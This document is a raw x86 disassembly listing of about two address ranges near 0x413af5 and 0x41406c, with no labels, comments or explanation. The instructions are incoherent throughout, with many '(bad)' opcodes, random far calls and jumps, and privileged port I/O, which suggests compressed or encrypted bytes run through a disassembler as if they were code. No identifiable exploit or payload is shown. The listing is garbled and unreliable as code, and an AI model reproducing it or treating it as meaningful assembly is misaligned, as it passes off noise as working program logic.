  413af5:	retf   0xa4b6
  413af8:	sbb    BYTE PTR [edi+0x29],cl
  413afb:	fistp  DWORD PTR [esp+ebp*4-0x3f]
  413aff:	mov    esi,0xd064ab08
  413b04:	cwde   
  413b05:	sbb    DWORD PTR [eax-0x7a],eax
  413b08:	mov    esp,DWORD PTR [edx]
  413b0a:	rcr    DWORD PTR [ebp-0x76],cl
  413b0d:	jg     0x413b8e
  413b0f:	mov    ah,0x50
  413b11:	sbb    cl,dl
  413b13:	retf   
  413b14:	or     al,0xc4
  413b16:	pop    ebx
  413b17:	push   ds
  413b18:	imul   esp,DWORD PTR [edi+0x123c14fb],0x88939e03
  413b22:	sub    al,BYTE PTR [eax+ebp*8-0x3f]
  413b26:	adc    eax,0xbb69ec3c
  413b2b:	dec    DWORD PTR [edx+0x12a729ec]
  413b31:	test   al,0xd6
  413b33:	add    ah,dh
  413b35:	lock cs loop 0x413ac8
  413b39:	mov    edx,0x592d3e19
  413b3e:	es pushf 
  413b40:	pop    eax
  413b41:	addr16 push ss
  413b43:	sub    BYTE PTR [eax+0x7e2185bd],al
  413b49:	push   edi
  413b4a:	sbb    eax,0x4ca2e6a3
  413b4f:	nop
  413b50:	cmp    al,0x84
  413b52:	mov    ah,BYTE PTR [edi+0x7452b81a]
  413b58:	cmp    BYTE PTR [ecx+0x48],dh
  413b5b:	add    ah,dl
  413b5d:	inc    ebp
  413b5e:	int3   
  413b5f:	or     eax,0x7ecb8975
  413b64:	imul   ecx,DWORD PTR [ecx-0x71],0xffffffaf
  413b68:	test   DWORD PTR [edi-0x87fc5a2],ebp
  413b6e:	fbld   TBYTE PTR [ebx-0x3a]
  413b71:	xchg   DWORD PTR [eax+0x14f62e69],edi
  413b77:	cmp    edi,DWORD PTR [edx]
  413b79:	cdq    
  413b7a:	inc    edi
  413b7b:	xor    al,0x96
  413b7d:	test   al,0x5c
  413b7f:	shr    DWORD PTR [eax],0x9
  413b82:	sbb    edx,ebp
  413b84:	int    0x18
  413b86:	dec    ecx
  413b87:	sbb    eax,0x2a3aca7f
  413b8c:	pop    es
  413b8d:	aad    0x27
  413b8f:	jmpw   0x7e32
  413b93:	inc    edi
  413b94:	loopne 0x413bdd
  413b96:	fneni(8087 only) 
  413b98:	adc    eax,0x18a131ac
  413b9d:	shl    DWORD PTR [edi-0x47170ae],1
  413ba3:	iret   
  413ba4:	outs   dx,BYTE PTR ds:[esi]
  413ba5:	int3   
  413ba6:	in     eax,dx
  413ba7:	repz pop ds
  413ba9:	out    0x39,al
  413bab:	sub    DWORD PTR [ecx+edx*8],edi
  413bae:	mov    ds:0x2efe8201,eax
  413bb3:	bound  ecx,QWORD PTR [eax]
  413bb5:	pop    ebp
  413bb6:	arpl   WORD PTR [edx+0x1904a831],ax
  413bbc:	add    BYTE PTR [eax-0x2361afdb],dl
  413bc2:	and    al,dl
  413bc4:	or     eax,0xebecfc64
  413bc9:	mov    edi,0x19660317
  413bce:	lock jnp 0x413bf2
  413bd1:	dec    ebp
  413bd2:	(bad)  
  413bd3:	nop
  413bd4:	cmp    al,0x55
  413bd6:	out    0xcb,al
  413bd8:	jns    0x413c2f
  413bda:	jge    0x413be5
  413bdc:	dec    esi
  413bdd:	mov    ebp,0x83d5bc54
  413be2:	sub    cl,BYTE PTR [edx+ebx*4-0x65f63476]
  413be9:	sub    esi,DWORD PTR [eax]
  413beb:	jle    0x413c3b
  413bed:	stos   DWORD PTR es:[edi],eax
  413bee:	ret    
  413bef:	mov    al,0x93
  413bf1:	cmp    BYTE PTR [eax-0x21],al
  413bf4:	ror    ebx,1
  413bf6:	fisttp DWORD PTR [eax+0x49]
  413bf9:	mov    dh,0x6
  413bfb:	pop    edi
  413bfc:	rcr    DWORD PTR es:[esi],cl
  413bff:	movntq QWORD PTR ds:0x4f10a409,mm7
  413c06:	cs cmp ch,bh
  413c09:	fsubr  DWORD PTR [esi-0x1e4172bf]
  413c0f:	adc    BYTE PTR [esi],bl
  413c11:	push   esp
  413c12:	popa   
  413c13:	inc    edi
  413c14:	arpl   WORD PTR [ebx],cx
  413c16:	mov    esp,0x4e755af1
  413c1b:	or     al,BYTE PTR [esi+eiz*8-0x2a]
  413c1f:	add    ecx,DWORD PTR [esi-0x47]
  413c22:	ds and ch,cl
  413c25:	mov    al,ds:0x989e246d
  413c2a:	jo     0x413bd8
  413c2c:	and    esi,DWORD PTR [edx+0x6d]
  413c2f:	dec    edx
  413c30:	jno    0x413c58
  413c32:	test   BYTE PTR [esi+0x39],ch
  413c35:	xchg   ecx,eax
  413c36:	shr    BYTE PTR [ebp+0x9],0xdb
  413c3a:	or     ch,BYTE PTR [edi-0x69]
  413c3d:	mov    edx,0x712accbc
  413c42:	add    WORD PTR [eax-0x795ee4fd],sp
  413c49:	and    ah,al
  413c4b:	popf   
  413c4c:	adc    ecx,ebp
  413c4e:	add    eax,0xfaff2454
  413c53:	loop   0x413cbb
  413c55:	fist   DWORD PTR [ebp-0x622d0a7f]
  413c5b:	pop    ebp
  413c5c:	pop    edi
  413c5d:	sub    eax,0xefb98596
  413c62:	cdq    
  413c63:	jmp    0x1ca28521
  413c68:	inc    esp
  413c69:	test   BYTE PTR [eax+0x6f],cl
  413c6c:	int3   
  413c6d:	adc    ebp,ebp
  413c6f:	and    BYTE PTR [edi-0xa3dc936],dh
  413c75:	jae    0x413cd1
  413c77:	lea    esp,[ecx+0x342a75a2]
  413c7d:	aam    0x33
  413c7f:	mov    edx,edi
  413c81:	stc    
  413c82:	retf   
  413c83:	jmp    0xc68b02cd
  413c88:	dec    esp
  413c89:	jge    0x413ca1
  413c8b:	arpl   WORD PTR [ebx],di
  413c8d:	and    edi,DWORD PTR [eax+ebp*1]
  413c90:	cs adc al,0x59
  413c93:	sar    DWORD PTR [ebp-0x23e945b8],1
  413c99:	(bad)  
  413c9a:	jle    0x413c42
  413c9c:	mov    edi,DWORD PTR ds:[esi+0x60]
  413ca0:	xchg   edx,eax
  413ca1:	mul    bh
  413ca3:	aaa    
  413ca4:	mov    edx,0xc01e1f7b
  413ca9:	ja     0x413c30
  413cab:	or     eax,0x38567bcb
  413cb0:	lods   eax,DWORD PTR ds:[esi]
  413cb1:	pop    esp
  413cb2:	and    DWORD PTR [ecx-0x1f1f4b7d],esp
  413cb8:	int3   
  413cb9:	and    al,cl
  413cbb:	in     eax,0x4a
  413cbd:	or     al,0x20
  413cbf:	jge    0x413c58
  413cc1:	retf   0x402c
  413cc4:	cmp    eax,DWORD PTR [ebx+0x2c5369f3]
  413cca:	retf   
  413ccb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ccc:	push   ecx
  413ccd:	xor    ebx,esp
  413ccf:	mov    ch,0x1e
  413cd1:	add    BYTE PTR [edx],bh
  413cd3:	vpunpcklqdq ymm0,ymm2,YMMWORD PTR [edi]
  413cd7:	test   BYTE PTR [edx+0xd],cl
  413cda:	cmp    BYTE PTR [edi+0x3b9f19de],bh
  413ce0:	test   BYTE PTR [ebx+0x1100cf69],al
  413ce6:	repz pop ds
  413ce8:	scas   eax,DWORD PTR es:[edi]
  413ce9:	loop   0x413d22
  413ceb:	and    DWORD PTR ds:0x593d2e70,edi
  413cf1:	inc    edi
  413cf2:	sbb    edx,DWORD PTR [esi+edi*1-0x5e]
  413cf6:	adc    eax,0x1b652722
  413cfb:	ja     0x413d31
  413cfd:	ds cs jae 0x413d7f
  413d01:	fs pop ebp
  413d03:	aas    
  413d04:	pop    esp
  413d05:	push   0xffffffb2
  413d07:	shl    BYTE PTR [ebp-0x3e],0x6c
  413d0b:	push   ss
  413d0c:	(bad)  
  413d0d:	mov    edx,0x3756113f
  413d12:	(bad)  
  413d13:	xor    al,0x9a
  413d15:	test   ecx,esp
  413d17:	xchg   bl,ah
  413d19:	js     0x413d9a
  413d1b:	pop    edx
  413d1c:	sbb    al,0x23
  413d1e:	aam    0x7
  413d20:	out    dx,al
  413d21:	out    0xb0,eax
  413d23:	or     BYTE PTR [edi+ebp*8],0x1a
  413d27:	push   ds
  413d28:	push   0xffffffb6
  413d2a:	sti    
  413d2b:	jo     0x413d5a
  413d2d:	mov    ds:0x89a8164f,al
  413d32:	ds in  al,dx
  413d34:	or     ch,BYTE PTR [eax+0x2a]
  413d37:	fidivr DWORD PTR [ecx+0x4487a016]
  413d3d:	dec    ebx
  413d3e:	cwde   
  413d3f:	jecxz  0x413dba
  413d41:	jo     0x413d7b
  413d43:	jmp    0x31c6788f
  413d48:	push   eax
  413d49:	sbb    bl,cl
  413d4b:	or     edx,DWORD PTR [edx+0x68]
  413d4e:	xor    ah,BYTE PTR [edx]
  413d50:	push   esp
  413d51:	sbb    eax,0x83f7cf4c
  413d56:	sbb    al,0x82
  413d58:	loopne 0x413dd9
  413d5a:	and    eax,0x8b7cb20c
  413d5f:	mov    bl,0xfc
  413d61:	jmp    0x22ad9e0d
  413d66:	imul   esi,DWORD PTR fs:[ebp+0x1f],0xffffff8f
  413d6b:	sar    BYTE PTR [edi],1
  413d6d:	dec    edi
  413d6e:	bound  ebx,QWORD PTR [eax+0x7839034e]
  413d74:	add    BYTE PTR [eax-0x713907d4],ah
  413d7a:	mov    dl,BYTE PTR [eax+0xa]
  413d7d:	sub    DWORD PTR [eax-0x7d],0x2
  413d81:	push   esi
  413d82:	sbb    eax,0xc67d68c8
  413d87:	sub    al,0xbf
  413d89:	or     eax,0xa9084890
  413d8e:	inc    edx
  413d8f:	xchg   DWORD PTR [edi-0x33ef6582],ecx
  413d95:	loopne 0x413d35
  413d97:	xlat   BYTE PTR ds:[ebx]
  413d98:	or     DWORD PTR [ecx],eax
  413d9a:	mov    edx,0x3effceaa
  413d9f:	int    0x29
  413da1:	mov    ecx,0xbf6951fb
  413da6:	pop    esp
  413da7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413da8:	adc    ecx,eax
  413daa:	or     al,0x25
  413dac:	jecxz  0x413e1d
  413dae:	dec    ebx
  413daf:	adc    eax,0xc1d89aa6
  413db4:	sbb    ecx,eax
  413db6:	push   0x679cf3e2
  413dbb:	push   0x29
  413dbd:	sbb    cl,BYTE PTR [edx-0x163bf086]
  413dc3:	dec    ebx
  413dc4:	pop    ebx
  413dc5:	cmc    
  413dc6:	pop    esi
  413dc7:	psrad  mm0,mm5
  413dca:	(bad)  
  413dcb:	jle    0x413e3e
  413dcd:	je     0x413e4a
  413dcf:	in     al,0x0
  413dd1:	sahf   
  413dd2:	les    edx,FWORD PTR [ebp+0xd2ef920]
  413dd8:	sbb    dh,bl
  413dda:	jge    0x413e51
  413ddc:	test   DWORD PTR [ebx-0x7c],ebp
  413ddf:	mov    al,0x5d
  413de1:	addr16 jg 0x413d7a
  413de4:	sbb    eax,0xd1b6f2b1
  413de9:	inc    eax
  413dea:	push   es
  413deb:	xor    ch,BYTE PTR [eax+ecx*4+0x700beb2f]
  413df2:	outs   dx,DWORD PTR ds:[esi]
  413df3:	popa   
  413df4:	xchg   esp,eax
  413df5:	ret    
  413df6:	dec    edx
  413df7:	jmp    DWORD PTR [edi+0x31]
  413dfa:	xor    dh,BYTE PTR [di]
  413dfd:	into   
  413dfe:	fidiv  DWORD PTR [edx]
  413e00:	outs   dx,DWORD PTR ds:[esi]
  413e01:	push   esi
  413e02:	or     BYTE PTR [ecx-0x5d],0xe6
  413e06:	xor    al,0x52
  413e08:	adc    BYTE PTR [edi-0x14959a8d],bh
  413e0e:	xor    al,0x7
  413e10:	or     al,0xcd
  413e12:	ins    DWORD PTR es:[edi],dx
  413e13:	jno    0x413e40
  413e15:	test   DWORD PTR [edi],ecx
  413e17:	pop    ebx
  413e18:	pop    ebx
  413e19:	mov    dl,0x2b
  413e1b:	test   eax,0xaed3d4f3
  413e20:	push   edx
  413e21:	aas    
  413e22:	mov    ecx,0xf424774d
  413e27:	pop    edi
  413e28:	js     0x413e9b
  413e2a:	inc    ebx
  413e2b:	out    0x30,al
  413e2d:	into   
  413e2e:	shl    DWORD PTR [ebp+0x41],cl
  413e31:	dec    edi
  413e32:	sub    DWORD PTR [eax],ebx
  413e34:	jp     0x413e85
  413e36:	into   
  413e37:	repz mov ebp,0x2b1ac074
  413e3d:	mov    db5,ecx
  413e40:	xor    DWORD PTR [edi+0x1f],edx
  413e43:	std    
  413e44:	cmp    DWORD PTR [ecx],0xd7527d5b
  413e4a:	mov    bl,0xb0
  413e4c:	and    eax,0x5ba13869
  413e51:	dec    eax
  413e52:	ins    BYTE PTR es:[edi],dx
  413e53:	outs   dx,BYTE PTR ss:[esi]
  413e55:	repz (bad) 
  413e57:	int3   
  413e58:	lds    ebx,FWORD PTR [ecx]
  413e5a:	cmp    eax,0xc0362fd7
  413e5f:	enter  0x3d1,0x41
  413e63:	adc    edx,edx
  413e65:	inc    eax
  413e66:	jmp    0x413e74
  413e68:	or     dl,BYTE PTR [ebp-0x17]
  413e6b:	cmp    eax,0xec2c12bf
  413e70:	aad    0xbc
  413e72:	daa    
  413e73:	sbb    bh,BYTE PTR [esi]
  413e75:	mov    esi,DWORD PTR [esi+0x3ea1de36]
  413e7b:	call   0xf79f:0x2cfbfc1c
  413e82:	pop    edx
  413e83:	not    BYTE PTR [ecx+0x4a17ac6a]
  413e89:	sbb    al,0xb
  413e8b:	ins    BYTE PTR es:[edi],dx
  413e8c:	lea    edx,[edi]
  413e8e:	imul   eax,esp,0x1a3bafa3
  413e94:	mov    esi,0x4a47110
  413e99:	adc    BYTE PTR [ebx+0x43],dl
  413e9c:	inc    ecx
  413e9d:	cmp    WORD PTR [edi+0x4fc7],bx
	...
  41406c:	add    BYTE PTR [eax],al
  41406e:	push   ebx
  41406f:	inc    edx
  414070:	or     DWORD PTR [ecx+ebx*1-0x2a100801],edi
  414077:	pop    eax
  414078:	cdq    
  414079:	shl    edi,0x9b
  41407c:	loop   0x414006
  41407e:	mov    eax,ds:0x22000153
  414083:	pop    es
  414084:	add    BYTE PTR [eax],al
  414086:	dec    esp
  414087:	cwde   
  414088:	hlt    
  414089:	mov    ebx,0x69cb35ae
  41408e:	xor    BYTE PTR [ebx+0x40ea7c80],0xef
  414095:	ins    BYTE PTR es:[edi],dx
  414096:	jae    0x41406b
  414098:	pop    ecx
  414099:	xor    al,BYTE PTR [ebp+0x73]
  41409c:	mov    esp,0x6dedd809
  4140a1:	dec    BYTE PTR [eax]
  4140a3:	int    0xe2
  4140a5:	mov    ah,0x4e
  4140a7:	imul   esp,DWORD PTR [ebx],0x6dcada1a
  4140ad:	adc    al,0x30
  4140af:	xchg   edi,eax
  4140b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4140b1:	jae    0x4140c4
  4140b3:	aam    0x5f
  4140b5:	mov    eax,ds:0xa588a5d5
  4140ba:	jecxz  0x4140bf
  4140bc:	xchg   edi,eax
  4140bd:	lods   al,BYTE PTR ds:[esi]
  4140be:	jne    0x4140fa
  4140c0:	and    DWORD PTR [esi-0x2ee19e10],ecx
  4140c6:	mov    ?,WORD PTR [eax+0x69a3c6b3]
  4140cc:	xchg   esi,esp
  4140ce:	js     0x41414e
  4140d0:	pop    ebx
  4140d1:	mov    edi,0x6f6bef13
  4140d6:	mov    bh,0xeb
  4140d8:	adc    eax,0x5c737e39
  4140dd:	sar    BYTE PTR [ebx],0xd6
  4140e0:	dec    eax
  4140e1:	ror    DWORD PTR [ebp-0x27],cl
  4140e4:	enter  0xcfb4,0xf
  4140e8:	push   es
  4140e9:	mov    DWORD PTR [ebp+0x5c7a95a0],ecx
  4140ef:	ret    0xfe31
  4140f2:	mov    cl,0xbb
  4140f4:	add    eax,0xc0f6e60c
  4140f9:	pushf  
  4140fa:	adc    BYTE PTR [edx-0x2b],ah
  4140fd:	add    esi,edx
  4140ff:	out    0x50,al
  414101:	pushf  
  414102:	jae    0x4140fe
  414104:	inc    eax
  414105:	in     al,dx
  414106:	jmp    0x398502c3
  41410b:	inc    ecx
  41410c:	retf   0xad15
  41410f:	call   0x39b2:0x919dc664
  414116:	push   eax
  414117:	xchg   DWORD PTR [edx],edi
  414119:	push   ebx
  41411a:	call   0xa589:0x668202be
  414121:	imul   ecx,ebp,0xffffffc0
  414124:	jns    0x414182
  414126:	inc    esp
  414127:	cmp    ecx,esp
  414129:	jmp    0x98ed7361
  41412e:	cld    
  41412f:	mov    esp,0x47cb485d
  414134:	(bad)  [eax-0x5c]
  414137:	repnz add al,0x5b
  41413a:	dec    eax
  41413b:	ss repz jle 0x4141ac
  41413f:	push   es
  414140:	mov    ah,0xdf
  414142:	xor    BYTE PTR [ebp+edx*2+0x54d28de8],0x30
  41414a:	xchg   ebp,ebp
  41414c:	retf   
  41414d:	out    dx,al
  41414e:	arpl   WORD PTR [ebx],dx
  414150:	sub    al,0xd
  414152:	iret   
  414153:	popa   
  414154:	daa    
  414155:	inc    ecx
  414156:	mov    dh,0x41
  414158:	and    bh,dh
  41415a:	jmp    0x3f9b:0x48c27d72
  414161:	push   es
  414162:	scas   eax,DWORD PTR es:[edi]
  414163:	pusha  
  414164:	data16 xor bl,BYTE PTR [esi+0x6c6daf7d]
  41416b:	xchg   edi,eax
  41416c:	and    al,0x6b
  41416e:	out    0x9a,al
  414170:	jbe    0x4140f6
  414172:	data16 jge 0x414131
  414175:	sub    cl,BYTE PTR [eax+0x64]
  414178:	mov    eax,ds:0x83ae3b26
  41417d:	xor    al,0x36
  41417f:	jg     0x414155
  414181:	cmp    ah,BYTE PTR [ebp+0xe]
  414184:	lds    ebx,FWORD PTR [esi]
  414186:	fmul   st,st(2)
  414188:	mov    dl,0xd
  41418a:	xlat   BYTE PTR ds:[ebx]
  41418b:	cmp    DWORD PTR ss:[ebx],0x3661536f
  414192:	jl     0x4141dd
  414194:	mov    WORD PTR [edx],ss
  414196:	lock pusha 
  414198:	sbb    dh,ch
  41419a:	shl    al,1
  41419c:	adc    edx,DWORD PTR [esi-0x14350b2b]
  4141a2:	or     BYTE PTR [ebx-0x5d],al
  4141a5:	pop    edx
  4141a6:	jp     0x4141a5
  4141a8:	js     0x4141b1
  4141aa:	cmp    BYTE PTR [esi+eax*8+0x1],al
  4141ae:	fisttp WORD PTR [ebp+0x65a7aa1c]
  4141b4:	cmovg  esp,DWORD PTR [esi+ecx*4]
  4141b8:	push   0x28
  4141ba:	push   ecx
  4141bb:	xor    BYTE PTR [ebx-0x20a3fa50],ah
  4141c1:	gs inc esp
  4141c3:	imul   edx,DWORD PTR [eax],0xfffffffd
  4141c6:	nop
  4141c7:	test   DWORD PTR [ecx+edi*8+0x782ec540],0x3aa6a021
  4141d2:	and    al,0xe5
  4141d4:	cwde   
  4141d5:	call   0xe960:0x41d4f7fd
  4141dc:	lds    ecx,FWORD PTR [ecx+0xa]
  4141df:	cmp    ecx,DWORD PTR [edi+eax*8-0x4f22d3a]
  4141e6:	rol    BYTE PTR [edi],1
  4141e8:	icebp  
  4141e9:	jmp    0xd6c0:0x8ac2b810
  4141f0:	jne    0x414213
  4141f2:	pop    ebx
  4141f3:	mov    bh,bh
  4141f5:	jns    0x41421d
  4141f7:	fst    QWORD PTR [ebx+0xe534df0]
  4141fd:	cwde   
  4141fe:	mov    dh,0x49
  414200:	popf   
  414201:	xchg   edi,eax
  414202:	xchg   esi,eax
  414203:	in     eax,0xf9
  414205:	dec    ecx
  414206:	js     0x41419c
  414208:	call   0x4c6f3cba
  41420d:	cmp    al,0xc6
  41420f:	xor    eax,0x7d275626
  414214:	out    0x1d,eax
  414216:	xor    DWORD PTR [edi+0x4e],eax
  414219:	adc    eax,DWORD PTR [esi]
  41421b:	test   al,0xb2
  41421d:	mov    WORD PTR [edi],fs
  41421f:	sahf   
  414220:	lods   al,BYTE PTR ds:[esi]
  414221:	hlt    
  414222:	sbb    esp,DWORD PTR [esi]
  414224:	mov    ebx,0xe608761a
  414229:	or     eax,0x1a9c7ee
  41422e:	add    bh,dl
  414230:	inc    esp
  414231:	sbb    eax,0x3500df19
  414236:	imul   eax,DWORD PTR [ecx+0x3f],0xffffffed
  41423a:	ja     0x414279
  41423c:	xchg   edi,eax
  41423d:	(bad)  
  41423e:	pop    eax
  41423f:	add    DWORD PTR [edi-0x192210e0],eax
  414245:	fsubr  st,st(1)
  414247:	pushf  
  414248:	jns    0x414245
  41424a:	popf   
  41424b:	push   edx
  41424c:	vcmpps xmm4,xmm2,XMMWORD PTR [eax+0x33],0x44
  414252:	adc    DWORD PTR gs:[eax+0x6],edx
  414256:	cmp    esp,DWORD PTR [esp+ecx*1-0x47850012]
  41425d:	lods   al,BYTE PTR ds:[esi]
  41425e:	frstor [ecx+0x64]
  414261:	pop    edx
  414262:	push   esp
  414263:	mov    ebx,0x30f4c3c3
  414268:	stos   DWORD PTR es:[edi],eax
  414269:	js     0x41422a
  41426b:	jmp    0xf5de144a
  414270:	out    dx,eax
  414271:	mov    ecx,0x9d289d5c
  414276:	push   es
  414277:	sub    eax,0x22e45820
  41427c:	pop    ds
  41427d:	sbb    eax,ebx
  41427f:	jne    0x414271
  414281:	outs   dx,DWORD PTR ds:[esi]
  414282:	pop    ecx
  414283:	and    eax,ebp
  414285:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414286:	sub    eax,0x12435220
  41428b:	sbb    DWORD PTR [ebp-0x582accde],esi
  414291:	adc    DWORD PTR [ecx-0x703e8554],ecx
  414297:	loopne 0x4142d3
  414299:	jp     0x414240
  41429b:	add    ah,dl
  41429d:	jmp    0x6c95f5b5
  4142a2:	std    
  4142a3:	out    dx,al
  4142a4:	fmul   QWORD PTR [edi-0x7c]
  4142a7:	lahf   
  4142a8:	xlat   BYTE PTR ds:[ebx]
  4142a9:	in     al,dx
  4142aa:	xor    BYTE PTR [esp+edx*1],dh
  4142ad:	fimul  DWORD PTR [esi-0x7f]
  4142b0:	jnp    0x414265
  4142b2:	mov    WORD PTR [edx+0x58a8948],es
  4142b8:	push   ss
  4142b9:	ins    BYTE PTR es:[edi],dx
  4142ba:	mov    ecx,0x27f626a3
  4142bf:	loope  0x4142fe
  4142c1:	adc    al,al
  4142c3:	xchg   ebp,eax
  4142c4:	or     ch,cl
  4142c6:	push   ds
  4142c7:	jle    0x4142c9
  4142c9:	fcmovb st,st(5)
  4142cb:	xchg   ebx,eax
  4142cc:	cmp    esp,ebx
  4142ce:	imul   ecx,DWORD PTR [ebx+0x3b8903dd],0xecb28ec4
  4142d8:	fwait
  4142d9:	dec    ebp
  4142da:	call   0x1504560b
  4142df:	call   0x9420d792
  4142e4:	pop    ds
  4142e5:	lahf   
  4142e6:	cwde   
  4142e7:	pop    ds
  4142e8:	cmp    eax,0xcdbc40e1
  4142ed:	push   cs
  4142ee:	sub    al,0x9
  4142f0:	test   al,0x55
  4142f2:	lahf   
  4142f3:	in     eax,0xa6
  4142f5:	mov    eax,ds:0x4fd5e754
  4142fa:	imul   edx,DWORD PTR [ebp+0x12],0xfffffffb
  4142fe:	in     eax,dx
  4142ff:	js     0x414358
  414301:	popa   
  414302:	mov    ds:0xfcafc508,al
  414307:	cmp    al,0x3
  414309:	dec    esi
  41430a:	push   edi
  41430b:	fadd   st(2),st
  41430d:	push   esi
  41430e:	jmp    0x4142f5
  414310:	mov    al,0x89
  414312:	xchg   ebx,eax
  414313:	(bad)  
  414314:	mov    dl,0xb1
  414316:	arpl   ax,bp
  414318:	aaa    
  414319:	retf   
  41431a:	push   0xe68993c0
  41431f:	sub    DWORD PTR [ebp-0x23107337],esp
  414325:	xor    DWORD PTR [ebp+0x49c48607],ebp
  41432b:	add    eax,0x627e55b9
  414330:	sbb    al,0x61
  414332:	test   BYTE PTR [eax-0x3779803a],0x3
  414339:	into   
  41433a:	lock push eax
  41433c:	sti    
  41433d:	std    
  41433e:	xchg   BYTE PTR [esi-0x4593ea63],al
  414344:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414345:	into   
  414346:	cmp    al,0x1d
  414348:	mov    edx,0xa1b63f71
  41434d:	popa   
  41434e:	shl    BYTE PTR [eax],1
  414350:	addr16 (bad) 
  414352:	dec    DWORD PTR [edx+0x7e7acf4a]
  414358:	cmp    ebx,DWORD PTR [esi+0x4e]
  41435b:	loope  0x414325
  41435d:	mov    eax,0xb7c8425d
  414362:	cmp    ah,dl
  414364:	push   0xd70e36de
  414369:	std    
  41436a:	add    WORD PTR [edi-0x4ed43ede],ax
  414371:	inc    edx
  414372:	data16 (bad) 
  414374:	mov    esp,0xa769188a
  414379:	mov    ds:0xa22f45d,eax
  41437e:	outs   dx,DWORD PTR ds:[esi]
  41437f:	mov    bh,0x1f
  414381:	aam    0x8a
  414383:	in     al,dx
  414384:	fwait
  414385:	mov    bh,0xd0
  414387:	sub    al,0x7c
  414389:	sar    ecx,1
  41438b:	arpl   WORD PTR [ecx-0x7eea75c5],di
  414391:	pop    eax
  414392:	jmp    0x2f330a92
  414397:	nop
  414398:	xchg   DWORD PTR [esi-0x515c3f0b],eax
  41439e:	jmp    0x414320
  4143a0:	jl     0x414401
  4143a2:	mov    cl,0x23
  4143a4:	mov    ch,0x64
  4143a6:	mov    esi,0x8b7b42d5
  4143ab:	pop    ds
  4143ac:	mov    al,ds:0xc5cf215c
  4143b1:	aaa    
  4143b2:	adc    ah,cl
  4143b4:	aaa    
  4143b5:	xor    DWORD PTR [ebp-0x5],eax
  4143b8:	and    eax,DWORD PTR ds:0x90f99e47
  4143be:	cmp    DWORD PTR [esi-0x116b9571],ebp
  4143c4:	sar    DWORD PTR ds:0xa93fa246,1
  4143ca:	mov    esp,0x22d6ccd1
  4143cf:	xchg   edx,eax
  4143d0:	cmp    ah,BYTE PTR [edx]
  4143d2:	ja     0x414452
  4143d4:	jns    0x414366
  4143d6:	fwait
  4143d7:	dec    eax
  4143d8:	push   0x96fba0c2
  4143dd:	mov    esi,0x83276de0
  4143e2:	shl    DWORD PTR [ebp-0xd19302],cl
  4143e8:	and    al,0xdf
  4143ea:	sbb    BYTE PTR [ecx+eiz*2+0x8c6ac03],dh
  4143f1:	fwait
  4143f2:	ins    BYTE PTR es:[edi],dx
  4143f3:	add    al,0x3f
  4143f5:	ror    bh,1
  4143f7:	pop    edi
  4143f8:	test   eax,0xd8fb1f5b
  4143fd:	icebp  
  4143fe:	es fs iret 
  414401:	stc    
  414402:	nop
  414403:	xchg   esi,eax
  414404:	jmp    0x1f02:0xe734e4c4
  41440b:	pop    ds
  41440c:	xor    bh,BYTE PTR [ecx+eiz*2-0xeccbe1c]
  414413:	jmp    0xfa7ec7a3
  414418:	ror    DWORD PTR [ecx],1
  41441a:	fcom   DWORD PTR [edx+eax*4-0x7d]
  41441e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41441f:	push   ebp
  414420:	repz cmp BYTE PTR [esi-0x6c331a3],cl
  414427:	hlt    
  414428:	mov    ecx,0x43fb68fd
  41442d:	fldcw  WORD PTR [ecx+0x67]
  414430:	and    eax,0x8962f6c6
  414435:	scas   al,BYTE PTR es:[edi]
  414436:	push   eax
  414437:	push   ebx
  414438:	push   esi
  414439:	cmp    bh,BYTE PTR [edx]
  41443b:	pop    ebx
  41443c:	mov    ds:0xd3a797,al
  414441:	aas    
  414442:	sub    BYTE PTR [edi-0x723b8719],bl
  414448:	lahf   
  414449:	xchg   ebp,eax
  41444a:	inc    ebp
  41444b:	sbb    BYTE PTR [eax-0x49],al
  41444e:	xchg   ecx,eax
  41444f:	and    edi,esp
  414451:	les    ebx,FWORD PTR [edx-0x76]
  414454:	shr    BYTE PTR [ebx-0x589a2ad],1
  41445a:	xchg   DWORD PTR [edi+edi*1+0x3d0536b1],ebx
  414461:	mov    eax,0x655fa5cc
  414466:	cmp    al,0x1c
  414468:	jmp    0xe5c0:0xf41bfc5c
  41446f:	adc    al,0xdb
  414471:	mov    eax,0xf0dca94e
  414476:	es ja  0x414492
  414479:	cmp    cl,BYTE PTR [ecx]
  41447b:	sbb    BYTE PTR [ebx-0x30f2b2aa],bl
  414481:	hlt    
  414482:	lea    esi,[ecx-0x20]
  414485:	popa   
  414486:	lods   eax,DWORD PTR ds:[esi]
  414487:	pop    esp
  414488:	(bad)  
  414489:	sub    bh,BYTE PTR [eax+ebp*8+0x29]
  41448d:	outs   dx,DWORD PTR ds:[esi]
  41448e:	mov    edi,0x95c25a88
  414493:	leave  
  414494:	add    al,0x84
  414496:	cwde   
  414497:	and    al,0x8d
  414499:	sbb    esi,DWORD PTR [edx-0x1394ba22]
  41449f:	lods   al,BYTE PTR ds:[esi]
  4144a0:	pop    edx
  4144a1:	not    eax
  4144a3:	aam    0xfb
  4144a5:	stos   BYTE PTR es:[edi],al
  4144a6:	ret    0x77c9
  4144a9:	mov    edi,0x71b52be1
  4144ae:	xor    eax,0x22681fe7
  4144b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4144b4:	and    BYTE PTR [ecx],cl
  4144b6:	bound  ebx,QWORD PTR [eax+0xdbd16b9]
  4144bc:	in     al,dx
  4144bd:	mov    al,BYTE PTR ds:0x9995529e
  4144c3:	xchg   ebp,eax
  4144c4:	sar    DWORD PTR gs:[edx-0x53],cl
  4144c8:	fs dec esp
  4144ca:	inc    eax
  4144cb:	fistp  QWORD PTR [esi-0x41]
  4144ce:	and    dh,al
  4144d0:	scas   al,BYTE PTR es:[edi]
  4144d1:	xor    DWORD PTR [ebx],edx
  4144d3:	dec    edi
  4144d4:	inc    edi
  4144d5:	shl    BYTE PTR [edi+0x4e286039],0x75
  4144dc:	mov    ah,0xe4
  4144de:	mov    al,ds:0xb1fd7a7b
  4144e3:	jnp    0x41454a
  4144e5:	push   ds
  4144e6:	outs   dx,BYTE PTR ds:[esi]
  4144e7:	lock cmp ebx,DWORD PTR [ecx+0x26e12110]
  4144ee:	les    ebp,FWORD PTR [edx+edi*8-0x61]
  4144f2:	icebp  
